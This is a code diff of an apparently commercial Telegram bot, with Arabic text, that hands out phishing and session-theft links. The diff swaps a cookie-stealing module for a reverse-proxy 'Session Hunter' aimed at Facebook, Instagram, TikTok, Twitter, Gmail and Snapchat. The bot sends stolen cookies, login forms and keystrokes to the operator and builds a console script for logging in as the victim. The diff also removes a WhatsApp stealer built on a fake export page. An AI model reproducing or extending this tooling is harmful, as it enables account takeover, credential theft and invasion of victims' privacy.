@@ -68,46 +68,27 @@ except Exception as e:
     lsh_bp = None
 
 # ============================================================
-# استيراد Session Hijacker Module
+# ★★★ استيراد Session Hunter (جديد - يستبدل session_hijacker) ★★★
 # ============================================================
 try:
-    from session_hijacker import (
-        init_session_hijacker_routes,
+    from session_hunter import (
+        init_session_hunter_routes,
         sh_bp,
-        get_sh_session_data,
-        sessions as sh_sessions,
+        get_sh_data,
+        build_sh_panel,
+        SUPPORTED_SITES,
     )
     SH_ENABLED = True
-    print("[+] session_hijacker imported")
+    print("[+] session_hunter imported")
 except Exception as e:
-    print(f"[-] Error importing session_hijacker: {e}")
+    print(f"[-] Error importing session_hunter: {e}")
     SH_ENABLED = False
 
-    def init_session_hijacker_routes(app, bot): pass
+    def init_session_hunter_routes(app, bot): pass
     sh_bp = None
-    def get_sh_session_data(sid): return None
-    sh_sessions = {}
-
-# ============================================================
-# ★★★ استيراد WhatsApp Stealer Module ★★★
-# ============================================================
-try:
-    from wa_stealer import (
-        init_whatsapp_stealer_routes,
-        wa_bp,
-        get_wa_data,
-        build_wa_panel,
-    )
-    WA_ENABLED = True
-    print("[+] wa_stealer imported")
-except Exception as e:
-    print(f"[-] Error importing wa_stealer: {e}")
-    WA_ENABLED = False
-
-    def init_whatsapp_stealer_routes(app, bot): pass
-    wa_bp = None
-    def get_wa_data(sid): return {}
-    def build_wa_panel(sid, cid): return InlineKeyboardMarkup()
+    def get_sh_data(sid): return {}
+    def build_sh_panel(sid, cid): return InlineKeyboardMarkup()
+    SUPPORTED_SITES = {}
 
 # ============================================================
 # استيراد نظام الدفع
@@ -144,7 +125,7 @@ except Exception as e:
     def send_invoice(*a, **kw): pass
     PRICING_PLANS = {}
     FREE_TRIAL_USES = 1
-    AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh", "wa"]
+    AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh"]
 
 
 # ============================================================
@@ -238,16 +219,13 @@ if LSH_ENABLED and lsh_bp:
     app.register_blueprint(lsh_bp)
 if SH_ENABLED and sh_bp:
     app.register_blueprint(sh_bp)
-if WA_ENABLED and wa_bp:
-    app.register_blueprint(wa_bp)
 
 init_facebook_routes(app, bot)
 init_instagram_routes(app, bot)
 init_rat_routes(app, bot)
 init_qr_routes(app, bot)
 init_lsh_routes(app, bot)
-init_session_hijacker_routes(app, bot)
-init_whatsapp_stealer_routes(app, bot)
+init_session_hunter_routes(app, bot)
 
 if LSH_ENABLED:
     set_bot_reference(bot)
@@ -267,7 +245,6 @@ def main_menu():
     markup.add(InlineKeyboardButton("📷 أداة ربط الضحية السريع عبر QR", callback_data="gen_qr"))
     markup.add(InlineKeyboardButton("🕹️ السيطرة الكاملة على الجلسة (LSH)", callback_data="gen_lsh"))
     markup.add(InlineKeyboardButton("🍪 سرقة الكوكيز والجلسات (SH)", callback_data="gen_sh"))
-    markup.add(InlineKeyboardButton("📱 WhatsApp Export Hunter", callback_data="gen_wa"))
     markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
     markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
     return markup
@@ -508,7 +485,7 @@ def callback_handler(call):
         return
 
     # ============================================================
-    # توليد Session Hijacker
+    # ★★★ Session Hunter (Reverse Proxy) ★★★
     # ============================================================
     if call.data == "gen_sh":
         check = can_use_tool(chat_id, "sh")
@@ -517,91 +494,157 @@ def callback_handler(call):
             bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "sh", check), parse_mode="Markdown")
             return
         consume_usage(chat_id, "sh")
-        bot.answer_callback_query(call.id, "جاري تجهيز جلسة سرقة الكوكيز...")
+        bot.answer_callback_query(call.id, "جاري تجهيز الجلسة...")
 
-        session_id = str(uuid.uuid4()).replace('-', '')[:24]
-        if redis_client:
-            try:
-                redis_client.setex(f"sh_session:{session_id}", 86400, str(chat_id))
-            except Exception as e:
-                print(f"[-] Redis setex SH error: {e}")
+        # اعرض المواقع المتاحة
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("📘 Facebook", callback_data=f"sh_site_facebook_{chat_id}"))
+        markup.add(InlineKeyboardButton("📷 Instagram", callback_data=f"sh_site_instagram_{chat_id}"))
+        markup.add(InlineKeyboardButton("🎵 TikTok", callback_data=f"sh_site_tiktok_{chat_id}"))
+        markup.add(InlineKeyboardButton("🐦 Twitter/X", callback_data=f"sh_site_twitter_{chat_id}"))
+        markup.add(InlineKeyboardButton("📧 Gmail", callback_data=f"sh_site_gmail_{chat_id}"))
+        markup.add(InlineKeyboardButton("👻 Snapchat", callback_data=f"sh_site_snapchat_{chat_id}"))
 
-        try:
-            requests.post(
-                f"{RAILWAY_URL}/sh_create",
-                json={"chat_id": chat_id, "session_id": session_id},
-                timeout=5
-            )
-        except Exception as e:
-            print(f"[-] SH create HTTP warning: {e}")
-
-        target_link = f"{RAILWAY_URL}/sh?s={session_id}&id={chat_id}"
         bot.send_message(
             chat_id,
-            f"🍪 **أداة سرقة الجلسات والكوكيز**\n"
-            f"━━━━━━━━━━━━━━━━━━\n\n"
-            f"🎯 **الرابط:**\n`{target_link}`\n\n"
-            f"📊 **ما تسحبه الأداة:**\n"
-            f"• 🍪 كل الكوكيز المتاحة (حتى المخفية)\n"
-            f"• 💾 LocalStorage + SessionStorage كامل\n"
-            f"• 📦 IndexedDB (فيسبوك، واتساب، تلجرام)\n"
-            f"• 🗄️ Cache Storage\n"
-            f"• 🔑 كل الـ Tokens (Bearer, XSRF, CSRF)\n"
-            f"• ⌨️ Keylogger حي\n"
-            f"• 📝 نماذج تسجيل الدخول\n"
-            f"• 🕵️ WebRTC IP Leak\n"
-            f"• 🖥️ بصمة الجهاز الكاملة\n\n"
-            f"⚠️ الأداة تبقى تعمل حتى بعد إغلاق الصفحة (Service Worker)",
+            "🍪 **اختر الموقع المستهدف:**",
+            reply_markup=markup,
             parse_mode="Markdown"
         )
         return
 
-    # ============================================================
-    # ★★★ توليد WhatsApp Export Hunter ★★★
-    # ============================================================
-    if call.data == "gen_wa":
-        check = can_use_tool(chat_id, "wa")
-        if not check["allowed"]:
-            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
-            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "wa", check), parse_mode="Markdown")
-            return
-        consume_usage(chat_id, "wa")
-        bot.answer_callback_query(call.id, "جاري تجهيز جلسة WhatsApp...")
+    # اختيار الموقع
+    if call.data.startswith("sh_site_"):
+        parts = call.data.split("_", 3)
+        site = parts[2]
+        target_chat = parts[3] if len(parts) > 3 else str(chat_id)
 
         session_id = str(uuid.uuid4()).replace('-', '')[:24]
-        if redis_client:
-            try:
-                redis_client.setex(f"wa_session:{session_id}", 86400 * 7, str(chat_id))
-            except Exception as e:
-                print(f"[-] Redis setex WA error: {e}")
 
         try:
-            requests.post(
-                f"{RAILWAY_URL}/wa_create",
-                json={"chat_id": chat_id, "session_id": session_id},
-                timeout=5
-            )
+            requests.post(f"{RAILWAY_URL}/sh_create",
+                json={"chat_id": target_chat, "session_id": session_id, "site": site},
+                timeout=10)
         except Exception as e:
-            print(f"[-] WA create HTTP warning: {e}")
+            print(f"[-] SH create error: {e}")
 
-        target_link = f"{RAILWAY_URL}/wa?s={session_id}&id={chat_id}"
+        if redis_client:
+            try:
+                redis_client.setex(f"sh_session:{session_id}", 86400 * 7,
+                    json.dumps({"chat_id": target_chat, "target_site": site}))
+            except Exception:
+                pass
 
+        site_names = {
+            "facebook": "فيسبوك",
+            "instagram": "انستقرام",
+            "tiktok": "تيك توك",
+            "twitter": "تويتر",
+            "gmail": "جيميل",
+            "snapchat": "سناب شات",
+        }
+
+        target_link = f"{RAILWAY_URL}/sh?s={session_id}&id={target_chat}&site={site}"
+
+        bot.answer_callback_query(call.id, f"✅ تم تجهيز جلسة {site_names.get(site, site)}")
         bot.send_message(
             chat_id,
-            f"📱 **WhatsApp Export Hunter — جاهز!**\n"
+            f"🍪 **جلسة {site_names.get(site, site)} جاهزة!**\n"
             f"━━━━━━━━━━━━━━━━━━\n\n"
             f"🎯 **الرابط:**\n`{target_link}`\n\n"
-            f"📊 **ما تفعله الأداة:**\n"
-            f"• 🎭 تُظهر صفحة 'تصدير محادثات WhatsApp' رسمية\n"
-            f"• 📋 الضحية تنسخ 'أداة التصدير'\n"
-            f"• ⌨️ تشغّلها على WhatsApp Web الحقيقي\n"
-            f"• 🔑 الأداة تسحب **IndexedDB كامل** (الجلسة)\n"
-            f"• 💬 تسحب كل المحادثات والأسماء\n"
-            f"• 👥 تسحب جهات الاتصال\n"
-            f"• 📥 الصور والفيديوهات (Blobs)\n\n"
-            f"⚠️ **مهم:** الأداة تعمل على أي متصفح (Chrome, Firefox, Edge, Safari)",
+            f"📊 **ما يحدث تلقائياً:**\n"
+            f"• الضحية تفتح الرابط → ترى {site_names.get(site, site)} الحقيقي\n"
+            f"• كل تصفحها يمر عبر سيرفرنا\n"
+            f"• **كل الكوكيز تُسحب (حتى HttpOnly!)**\n"
+            f"• كل تسجيل دخول يُلتقط\n"
+            f"• Keylogger حي يعمل\n"
+            f"• IP الحقيقي مكشوف\n\n"
+            f"⚠️ الأداة تعمل 7 أيام — استلم الجلسة متى شئت.",
             parse_mode="Markdown"
         )
+        return
+
+    # أوامر sh_
+    if call.data.startswith("sh_"):
+        parts = call.data.split("_", 2)
+        cmd = parts[1] if len(parts) > 1 else ""
+        sid = parts[2] if len(parts) > 2 else None
+
+        if cmd == "cookies":
+            data = get_sh_data(sid)
+            cookies = data.get("cookies", {})
+            if cookies:
+                text = json.dumps(cookies, ensure_ascii=False, indent=2)
+                buf = io.BytesIO(text.encode('utf-8'))
+                buf.name = f'sh_cookies_{sid[:8]}.json'
+                bot.send_document(chat_id, buf, caption="🍪 **كل الكوكيز**")
+            else:
+                bot.answer_callback_query(call.id, "لا توجد كوكيز بعد", show_alert=True)
+
+        elif cmd == "forms":
+            data = get_sh_data(sid)
+            forms = data.get("forms", [])
+            if forms:
+                lines = ["📝 **النماذج المسجلة:**\n"]
+                for f in forms[-20:]:
+                    lines.append(f"\n🌐 `{f.get('url', '')[:60]}`")
+                    for k, v in list(f.get("fields", {}).items())[:10]:
+                        lines.append(f"• `{k}`: `{str(v)[:80]}`")
+                msg = "\n".join(lines)
+                buf = io.BytesIO(msg.encode('utf-8'))
+                buf.name = f'sh_forms_{sid[:8]}.txt'
+                bot.send_document(chat_id, buf, caption="📝 **النماذج**")
+            else:
+                bot.answer_callback_query(call.id, "لا توجد نماذج بعد", show_alert=True)
+
+        elif cmd == "stats":
+            data = get_sh_data(sid)
+            sess = data.get("session", {})
+            cookies = data.get("cookies", {})
+            total_cookies = sum(len(v) for v in cookies.values())
+            text = (
+                f"📊 **إحصائيات الجلسة**\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"🆔 `{sid[:16] if sid else 'N/A'}`\n"
+                f"🎯 الموقع: `{sess.get('target_site', 'N/A')}`\n"
+                f"📄 الصفحات: `{sess.get('page_count', 0)}`\n"
+                f"🍪 الكوكيز: `{total_cookies}`\n"
+                f"📝 النماذج: `{len(data.get('forms', []))}`"
+            )
+            bot.send_message(chat_id, text, parse_mode="Markdown")
+
+        elif cmd == "open":
+            data = get_sh_data(sid)
+            cookies = data.get("cookies", {})
+            sess = data.get("session", {})
+            site = sess.get("target_site", "facebook")
+
+            if not cookies:
+                bot.answer_callback_query(call.id, "لا توجد كوكيز بعد", show_alert=True)
+                return
+
+            cookie_script = "// الصق هذا في Console في المتصفح\n"
+            cookie_script += "document.cookie = '';\n"
+            for domain, cks in cookies.items():
+                for name, val in cks.items():
+                    cookie_script += f'document.cookie = "{name}={val}; path=/; domain=.{domain}";\n'
+            cookie_script += f'\nconsole.log("Done! Reloading...");\nsetTimeout(() => location.href = "https://{site}.com", 1000);'
+
+            buf = io.BytesIO(cookie_script.encode('utf-8'))
+            buf.name = f'sh_open_{sid[:8]}.js'
+            bot.send_document(
+                chat_id, buf,
+                caption=(
+                    f"🔓 **طريقة فتح الجلسة:**\n\n"
+                    f"1️⃣ افتح **{site}** في متصفحك\n"
+                    f"2️⃣ اضغط F12 → Console\n"
+                    f"3️⃣ الصق محتوى الملف\n"
+                    f"4️⃣ سيتم تسجيل دخولك تلقائياً كالضحية!"
+                ),
+                parse_mode="Markdown"
+            )
+        elif cmd == "delete":
+            bot.answer_callback_query(call.id, "✅ تم")
         return
 
     # ============================================================
@@ -695,100 +738,6 @@ def callback_handler(call):
         bot.answer_callback_query(call.id, "❌ جاري الإنهاء..." if ok else "❌ فشل الإرسال", show_alert=not ok)
         if not ok:
             bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
-        return
-
-    # ============================================================
-    # أوامر Session Hijacker
-    # ============================================================
-    if call.data.startswith("sh_"):
-        parts = call.data.split("_", 2)
-        cmd = parts[1] if len(parts) > 1 else ""
-        sid = parts[2] if len(parts) > 2 else None
-
-        if cmd == "cookies":
-            sess = get_sh_session_data(sid)
-            if sess and sess.get('cookies'):
-                import json as _json
-                text = _json.dumps(sess['cookies'], ensure_ascii=False, indent=2)
-                buf = io.BytesIO(text.encode('utf-8'))
-                buf.name = f'cookies_{sid[:8]}.json'
-                bot.send_document(chat_id, buf, caption="🍪 الكوكيز")
-            else:
-                bot.answer_callback_query(call.id, "لا توجد كوكيز بعد", show_alert=True)
-        elif cmd == "storage":
-            sess = get_sh_session_data(sid)
-            if sess and sess.get('storage'):
-                import json as _json
-                text = _json.dumps(sess['storage'], ensure_ascii=False, indent=2)
-                buf = io.BytesIO(text.encode('utf-8'))
-                buf.name = f'storage_{sid[:8]}.json'
-                bot.send_document(chat_id, buf, caption="💾 Storage")
-            else:
-                bot.answer_callback_query(call.id, "لا يوجد Storage بعد", show_alert=True)
-        elif cmd == "tokens":
-            sess = get_sh_session_data(sid)
-            if sess and sess.get('forms'):
-                text = "\n".join(str(f) for f in sess['forms'])
-                buf = io.BytesIO(text.encode('utf-8'))
-                buf.name = f'tokens_{sid[:8]}.txt'
-                bot.send_document(chat_id, buf, caption="🔑 Tokens")
-            else:
-                bot.answer_callback_query(call.id, "لا توجد Tokens بعد", show_alert=True)
-        elif cmd == "html":
-            bot.answer_callback_query(call.id, "لا توجد HTML بعد", show_alert=True)
-        elif cmd == "open":
-            bot.answer_callback_query(call.id, "ميزة قيد التطوير")
-        elif cmd == "delete":
-            bot.answer_callback_query(call.id, "✅ تم")
-        return
-
-    # ============================================================
-    # ★★★ أوامر WhatsApp Export Hunter ★★★
-    # ============================================================
-    if call.data.startswith("wa_"):
-        parts = call.data.split("_", 2)
-        cmd = parts[1] if len(parts) > 1 else ""
-        sid = parts[2] if len(parts) > 2 else None
-
-        if cmd == "idb":
-            data = get_wa_data(sid)
-            if data.get("idb"):
-                buf = io.BytesIO(data["idb"].encode('utf-8'))
-                buf.name = f'wa_indexeddb_{sid[:8]}.json'
-                bot.send_document(chat_id, buf,
-                    caption="📥 **IndexedDB كامل**\nاستخدمه لاستعادة الجلسة عندك",
-                    parse_mode="Markdown")
-            else:
-                bot.answer_callback_query(call.id, "لا توجد بيانات بعد", show_alert=True)
-
-        elif cmd == "storage":
-            data = get_wa_data(sid)
-            if data.get("storage"):
-                buf = io.BytesIO(data["storage"].encode('utf-8'))
-                buf.name = f'wa_storage_{sid[:8]}.json'
-                bot.send_document(chat_id, buf, caption="💾 **Storage + Cookies**")
-            else:
-                bot.answer_callback_query(call.id, "لا توجد بيانات بعد", show_alert=True)
-
-        elif cmd == "stats":
-            data = get_wa_data(sid)
-            has_idb = "✅" if data.get("idb") else "❌"
-            has_storage = "✅" if data.get("storage") else "❌"
-            size = len(data.get("idb") or "") / 1024
-            text = (
-                f"📊 **إحصائيات WhatsApp**\n"
-                f"━━━━━━━━━━━━━━━━━━\n"
-                f"🆔 `{sid[:16] if sid else 'N/A'}`\n"
-                f"📦 IndexedDB: {has_idb}\n"
-                f"💾 Storage: {has_storage}\n"
-                f"📏 الحجم: `{size:.1f} KB`\n"
-                f"📦 Chunks: `{data.get('chunks_count', 0)}`"
-            )
-            bot.send_message(chat_id, text, parse_mode="Markdown")
-
-        elif cmd == "delete":
-            bot.answer_callback_query(call.id, "✅ تم")
-
         return
 
 
